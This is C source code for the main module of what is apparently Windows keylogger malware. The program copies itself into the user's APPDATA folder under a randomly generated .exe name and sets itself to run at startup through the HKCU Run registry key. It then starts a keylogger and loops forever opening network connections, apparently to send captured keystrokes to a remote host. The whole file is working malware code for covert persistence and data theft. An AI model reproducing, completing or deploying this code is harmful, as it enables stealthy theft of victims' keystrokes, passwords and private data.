#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include "net/interface.h"
#include "keylogger.h"
#include "types.h"

char main_globalPath[256];

char* main_nameGenerator(char* path)
{
    int i;
    int path_len = strlen(path);

    char* rv = malloc(path_len + 1 + 6 + 4 + sizeof(char));
    rv[path_len++] = '\\';

    for(i = 0;; i++)
    {
        if(i == 6)
        {
            rv[path_len + i] = '.';
            rv[path_len + i + 1] = 'e';
            rv[path_len + i + 2] = 'x';
            rv[path_len + i + 3] = 'e';
            rv[path_len + i + 4] = '\0';

            break;
        }

        rv[path_len + i] = 'a' + rand() % 25;
    }

    strncpy(rv, path, path_len - 1);

    return rv;
}

void main_config()
{
    int i;
    int lasSplit;
    int global_path_len = strlen(main_globalPath);
    char* path = malloc(global_path_len + sizeof(char));
    char* appdata_path = getenv("APPDATA");
    memset(path, 0, global_path_len + sizeof(char));

    for(i = 0;; i++)
    {
        if(i == global_path_len)
        {
            break;
        }

        if(main_globalPath[i] == '\\' || main_globalPath[i] == '/')
        {
            lasSplit = i;
        }
    }

    strncpy(path, main_globalPath, lasSplit);

    if(strncmp(main_globalPath, appdata_path, strlen(appdata_path))) //ako NE sa ednakvi
    {
        HKEY hkey;
        DWORD dwDispos;
        char* npath = main_nameGenerator(appdata_path);

        if(RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, NULL, 0, KEY_WRITE, NULL, &hkey, &dwDispos) != ERROR_SUCCESS)
        {
            exit(0);
        }

        RegSetValueEx(hkey, "runme", 0, REG_SZ, (LPBYTE)npath, strlen(npath) + 1);
        RegCloseKey(hkey);

        FILE *fo = fopen(main_globalPath, "rb");
        FILE *fd = fopen(npath, "wb");

        fseek(fo, 0, SEEK_END);
        long len = ftell(fo);
        fseek(fo, 0, SEEK_SET);

        uint8 *con = malloc(len + sizeof(uint8));
        fread(con, len, 1, fo);
        fwrite(con, 1, len, fd);

        fclose(fo);
        fclose(fd);

        exit(0);
    }

    free(path);
    free(appdata_path);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    if(strstr(GetCommandLine(), "-dontallow") == NULL)
    {
        srand(time(0));

        if(GetModuleFileName(NULL, main_globalPath, 256))
        {   
            main_config(); 
        }
    }
    
    keylogger_Start();
	net_Prepare();

	while(1)
	{
		net_CreateSocket();
		NET_WAIT_BETWEEN_FUNC();
		net_Connect();
		NET_WAIT_BETWEEN_FUNC();
	}

	return 0;
}